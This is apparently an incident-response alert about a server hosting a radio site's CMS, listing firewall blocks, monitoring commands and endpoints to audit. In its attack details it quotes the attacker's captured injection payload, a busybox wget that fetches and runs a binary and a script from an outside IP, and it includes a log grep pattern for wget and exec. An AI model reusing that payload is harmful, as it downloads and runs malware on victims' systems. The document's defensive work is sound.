# URGENT SECURITY ALERT - Active Attack in Progress

**Date:** December 5, 2025 22:30 UTC  
**Status:** CRITICAL - System Under Active Attack  
**Severity:** HIGH

## Summary

The malware file `sex.sh` was **recreated at 22:28 UTC** (approximately 2 hours after initial removal), indicating the system is under **active attack** and the attacker has found another entry point.

## Attack Details

### New Attack Vector
- **Attacker IP:** `193.34.213.150` (different from previous attack)
- **Attack Pattern:** Massive command injection attempts
- **Command Pattern:** `(cd /dev;busybox wget http://193.34.213.150/nuts/x86;chmod 777 x86;./x86 reactOnMynuts;busybox wget -q http://193.34.213.150/nuts/bolts -O-|sh)`
- **Impact:** Application logs show "Maximum call stack size exceeded" - application may be crashing

### Malware File
- **Path:** `/srv/payload/sex.sh`
- **Created:** 2025-12-05 22:28:03 UTC
- **Size:** 5,012 bytes (larger than previous version)
- **Status:** DELETED (but will likely be recreated)

## Immediate Actions Required

### 1. BLOCK ATTACKER IP (URGENT)
```bash
# Block the attacker IP at firewall level
sudo iptables -A INPUT -s 193.34.213.150 -j DROP
sudo iptables -A INPUT -s 216.158.232.43 -j DROP

# Or use ufw
sudo ufw deny from 193.34.213.150
sudo ufw deny from 216.158.232.43
```

### 2. PREVENT FILE CREATION
```bash
# Make directory read-only (if possible)
# Or create immutable file to prevent recreation
sudo touch /srv/payload/.sex.sh.lock
sudo chattr +i /srv/payload/.sex.sh.lock

# Monitor for file creation
sudo inotifywait -m /srv/payload -e create -e moved_to | grep sex.sh
```

### 3. RESTART APPLICATION
The application may be crashing due to attack attempts. Restart containers:
```bash
docker compose -f /srv/payload/docker-compose.yml restart payload-payload-1
```

### 4. INVESTIGATE OTHER VULNERABILITIES

**Potential Vulnerabilities to Check:**

1. **libretimeDb.ts** - Uses `exec()` with filepath parameter
   - Location: `src/server/lib/libretimeDb.ts`
   - Function: `updateLibreTimeFileExists(filepath: string, ...)`
   - **RISK:** If called from unauthenticated endpoint, filepath could be command injection vector
   - **ACTION:** Verify all callers have authentication

2. **Check all API endpoints** for:
   - Missing authentication
   - Command execution (`exec`, `spawn`, `execSync`)
   - User input passed to shell commands
   - SQL injection vulnerabilities

3. **Check for other entry points:**
   - File upload endpoints
   - GraphQL endpoints
   - Webhook endpoints
   - Admin panel vulnerabilities

### 5. ENABLE RATE LIMITING
Add rate limiting to all API endpoints to prevent brute force attacks.

### 6. MONITOR LOGS
```bash
# Monitor for new attacks
docker logs -f payload-payload-1 | grep -E "193\.34\.213\.150|wget|exec|spawn"

# Monitor file system
watch -n 1 'ls -lah /srv/payload/sex.sh 2>&1'
```

## Application Loading Issue

The user reports the app/website is not loading live or podcasts. This could be due to:

1. **Application crashes** from attack attempts (check logs for "Maximum call stack size exceeded")
2. **Resource exhaustion** from attack attempts
3. **Database connection issues** from attack attempts
4. **Separate unrelated issue**

**Check:**
```bash
# Check application health
curl -s https://content.diaradio.live/api/episodes?limit=1

# Check container status
docker ps

# Check application logs
docker logs payload-payload-1 --tail 100
```

## Long-term Security Measures

1. **Implement WAF (Web Application Firewall)**
2. **Add comprehensive logging and alerting**
3. **Implement file integrity monitoring**
4. **Regular security audits**
5. **Penetration testing**
6. **Consider moving to read-only filesystem for containers**

## Next Steps

1. ✅ Block attacker IPs
2. ✅ Restart application
3. ⚠️ Investigate other vulnerabilities
4. ⚠️ Add rate limiting
5. ⚠️ Implement monitoring
6. ⚠️ Security audit of all endpoints

---

**CRITICAL:** The system is actively being compromised. Immediate action required.

